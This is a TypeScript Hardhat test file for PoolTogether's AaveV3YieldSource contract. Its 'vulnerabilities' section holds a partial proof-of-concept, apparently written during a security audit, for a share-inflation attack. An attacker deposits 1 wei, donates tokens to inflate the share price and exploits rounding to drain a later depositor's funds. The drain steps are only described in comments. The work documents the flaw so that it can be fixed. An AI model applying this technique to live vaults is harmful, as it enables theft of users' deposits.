import { Signer } from '@ethersproject/abstract-signer';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { MockContract } from 'ethereum-waffle';
import { ethers, waffle } from 'hardhat';

import {
  AaveV3YieldSourceHarness,
  AaveV3YieldSourceHarness__factory,
  ERC20Mintable,
  PoolSimulator
} from '../types';

import IAToken from '../abis/IAToken.json';
import IRewardsController from '../abis/IRewardsController.json';
import IPool from '../abis/IPool.json';
import IPoolAddressesProvider from '../abis/IPoolAddressesProvider.json';
import IPoolAddressesProviderRegistry from '../abis/IPoolAddressesProviderRegistry.json';
import SafeERC20Wrapper from '../abis/SafeERC20Wrapper.json';

const { constants, getContractFactory, getSigners, utils } = ethers;
const { AddressZero, MaxUint256 } = constants;
const { parseEther: toWei, parseUnits } = utils;

const DECIMALS = 6;
const REFERRAL_CODE = 188;

describe('AaveV3YieldSource', () => {
  let contractsOwner: Signer;
  let yieldSourceOwner: SignerWithAddress;
  let wallet2: SignerWithAddress;
  let attacker: SignerWithAddress;

  let rewardsController: MockContract;
  let pool: PoolSimulator;
  let poolAddressesProvider: MockContract;
  let poolAddressesProviderRegistry: MockContract;

  let aaveV3YieldSource: AaveV3YieldSourceHarness;

  let usdcToken: ERC20Mintable;
  let aToken: ERC20Mintable;

  let constructorTest = false;

  const deployAaveV3YieldSource = async (
    aTokenAddress: string,
    rewardsControllerAddress: string,
    poolAddressesProviderRegistryAddress: string,
    decimals: number,
    owner: string,
  ): Promise<AaveV3YieldSourceHarness> => {
    const AaveV3YieldSource = (await ethers.getContractFactory(
      'AaveV3YieldSourceHarness',
    )) as AaveV3YieldSourceHarness__factory;

    return await AaveV3YieldSource.deploy(
      aTokenAddress,
      rewardsControllerAddress,
      poolAddressesProviderRegistryAddress,
      'PoolTogether aUSDC Yield',
      'PTaUSDCY',
      decimals,
      owner,
    );
  };

  beforeEach(async () => {
    const { deployMockContract } = waffle;

    [contractsOwner, yieldSourceOwner, wallet2, attacker] = await getSigners();

    const ERC20MintableContract = await getContractFactory('ERC20Mintable', contractsOwner);

    usdcToken = (await ERC20MintableContract.deploy('USD Coin', 'USDC', 6)) as ERC20Mintable;

    const aTokenSimulator = await getContractFactory('atokenSimulator', contractsOwner);

    //Deploy my own aToken
    aToken = (await aTokenSimulator.deploy('aToken', 'aToken', 18, usdcToken.address)) as ERC20Mintable;

    const PoolSimulator = await getContractFactory('PoolSimulator', contractsOwner);

    pool = (await PoolSimulator.deploy(usdcToken.address, aToken.address)) as PoolSimulator;

    rewardsController = await deployMockContract(contractsOwner, IRewardsController);

    poolAddressesProvider = await deployMockContract(contractsOwner, IPoolAddressesProvider);

    poolAddressesProviderRegistry = await deployMockContract(
      contractsOwner,
      IPoolAddressesProviderRegistry,
    );

    await poolAddressesProvider.mock.getPool.returns(pool.address);
    await poolAddressesProviderRegistry.mock.getAddressesProvidersList.returns([
      poolAddressesProvider.address,
    ]);

    if (!constructorTest) {
      aaveV3YieldSource = await deployAaveV3YieldSource(
        aToken.address,
        rewardsController.address,
        poolAddressesProviderRegistry.address,
        DECIMALS,
        yieldSourceOwner.address,
      );
    }
  });

  describe('PoolTogether vulnerabilities', () => {

    //For this test I assume USDC has 18 decimals rather than 6. I'm pretty sure it works either way; just making it easier on myself.
    it.only('allows easy pool draining if an early depositor ramps up the share price, then rug pulls', async () => {
      const USDC_DECIMALS = 18;
      console.log('Current vault shares: ', (await aaveV3YieldSource.totalSupply()).toString())
      console.log('Current vault token balance: ', (await usdcToken.balanceOf(aaveV3YieldSource.address)).toString())
      //Mint 1 share to attacker for 1 wei
      const ATTACKER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(10000)
      await usdcToken.connect(attacker).approve(aaveV3YieldSource.address, MaxUint256)
      console.log('336');
      await usdcToken.mint(attacker.address, ATTACKER_STARTING_BAL)  //Attacker starts with 10,000 USDC (well, not usdc due to decimals, but most other coins)
      console.log('339')
      await aaveV3YieldSource.connect(attacker).supplyTokenTo(1, attacker.address);

      console.log('342')

      //Attacker transfers in 1000 tokens to ramp share value up to 10^21 tokens / share
      await usdcToken.connect(attacker).transfer(aaveV3YieldSource.address, BigNumber.from(10).pow(USDC_DECIMALS).mul(1000));

      //Now some poor sap deposits 100,000 USDC
      const USER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      await usdcToken.mint(wallet2.address, USER_STARTING_BAL)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)
      await aaveV3YieldSource.connect(wallet2).supplyTokenTo(BigNumber.from(10).pow(USDC_DECIMALS), wallet2.address)

      console.log('New vault shares: ', (await aaveV3YieldSource.totalSupply()).toString())
      console.log('New vault token balance: ', (await usdcToken.balanceOf(aaveV3YieldSource.address)).toString())
      console.log('Tokens / share: ', (await aaveV3YieldSource.sharesToToken(1).toString()))

      //Now at this point I need to call withdraw over and over. If a share is worth 1000 tokens, I redeem 1999 tokens and burn 1 share, then deposit it back and repeat.

      expect(await aaveV3YieldSource.tokenToShares(toWei('1'))).to.equal(0);
      expect(await aaveV3YieldSource.sharesToToken(toWei('1'))).to.equal(BigNumber.from(10).pow(21));

      //Ramp up share price to an arbitrarily large value (let's say 10^21 tokens / share)

      // await aToken.mock.balanceOf
      //   .withArgs(aaveV3YieldSource.address)
      //   .returns(parseUnits('2', 23));

      //Once others have deposited, rug by exploiting incorrect round-down over and over again. This would probably be done through a smart contract in reality.
    })

    it('allows difficult pool draining whenever tokens / share gets too large', async () => {
      //Set up contract with a reasonable amount of tokens (let's say 100,000), and each share is worth 100 tokens

      //Now exploiter withdraws, exploiting incorrect round-down over and over again. This would probably be done by a smart contract in reality.
    })
  })
})